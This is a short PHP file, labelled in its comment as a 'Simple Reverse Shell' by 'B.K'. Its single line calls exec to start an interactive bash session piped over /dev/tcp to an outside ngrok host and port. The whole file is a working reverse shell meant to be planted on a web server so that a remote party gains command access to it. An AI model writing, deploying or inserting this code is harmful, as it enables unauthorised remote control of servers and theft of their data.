<?php
/* 
-- Created by B.K 
-- Simple Reverse Shell
*/
exec("/bin/bash -c 'exec bash -i &>/dev/tcp/2.tcp.ngrok.io/11119 <&1'");
